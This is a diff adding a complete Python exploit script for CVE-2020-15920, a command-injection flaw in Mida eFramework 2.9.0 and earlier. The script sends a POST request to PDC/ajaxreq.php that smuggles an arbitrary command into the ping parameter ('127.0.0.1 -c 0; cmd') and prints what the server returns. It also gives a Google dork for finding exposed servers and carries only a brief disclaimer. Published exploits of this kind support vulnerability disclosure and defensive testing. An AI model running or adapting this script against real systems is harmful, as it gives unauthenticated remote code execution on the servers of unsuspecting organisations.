@@ -1,0 +1,72 @@
+# Exploit Title: Mida eFramework 2.9.0 - Remote Code Execution
+# Google Dork: Server: Mida eFramework
+# Date: 2020-08-27
+# Exploit Author: elbae
+# Vendor Homepage: https://www.midasolutions.com/
+# Software Link: http://ova-efw.midasolutions.com/
+# Reference: https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
+# Version: <= 2.9.0
+# CVE : CVE-2020-15920
+
+
+#! /usr/bin/python3
+# -*- coding: utf-8 -*-
+
+import argparse
+import requests
+import subprocess
+from requests.packages.urllib3.exceptions import InsecureRequestWarning
+requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
+
+
+def print_disclaimer():
+   print("""
+    ---------------------
+    Disclaimer:
+    1) For testing purpose only.
+    2) Do not attack production environments.
+    3) Intended for educational purposes only and cannot be used for law
+violation or personal gain.
+    4) The author is not responsible for any possible harm caused by this
+material.
+    ---------------------""")
+
+
+def print_info():
+   print("""
+[*] PoC exploit for Mida eFramework <= 2.9.0 PDC (CVE-2020-15920)
+[*] Reference:
+https://elbae.github.io/jekyll/update/2020/07/14/vulns-01.html
+[*] Vulnerability: OS Command Injection Remote Code Execution Vulnerability
+(RCE) in PDC/ajaxreq.php
+    Version\t< 2.9.0\t./CVE-2020-15920
+http://192.168.1.60:8090/PDC/ajaxreq.php id
+    Version\t2.9.0\t./CVE-2020-15920 https://192.168.1.60/PDC/ajaxreq.php
+id """)
+
+def pwn(url,cmd):
+   running = """
+[*] Target URL: {0}
+[*] Command: {1}
+   """
+   print(running.format(url,cmd))
+   data = {
+      "DIAGNOSIS":"PING",
+      "PARAM":"127.0.0.1 -c 0; {0}".format(cmd)
+   }
+   r = requests.post(url,data=data,verify=False)
+   line = "[*]"+"-"*20+" Output " + "-" *20 +"[*]"
+   pretty_output = r.text.replace('<br>','\n')
+   print(line+"\n{0}\n".format(pretty_output)+line)
+
+def main():
+   print_info()
+   print_disclaimer()
+   parser = argparse.ArgumentParser()
+   parser.add_argument("target", type=str, help="the complete target URL")
+   parser.add_argument("cmd", type=str, help="the command you want to run")
+   args = parser.parse_args()
+   pwn(args.target, args.cmd)
+
+if __name__ == '__main__':
+   main()
